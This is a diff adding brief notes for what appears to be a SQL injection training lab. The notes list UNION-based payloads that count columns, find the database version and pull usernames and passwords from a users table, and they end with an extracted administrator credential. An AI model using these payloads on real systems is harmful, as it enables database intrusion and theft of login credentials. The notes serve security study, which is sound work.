@@ -1,0 +1,14 @@
+Lab #10: Retrieving multiple values in a single column
+
+Number of columns
+' order by 2--
+
+Column containing the text
+' union select null,'b'--
+
+Finding the database version 
+' union select null,version()--
+
+Retrieving multiple values in a single column
+' union select null,username||'~'||password from users--
+administrator~em52kty25lr4fr47n8sd
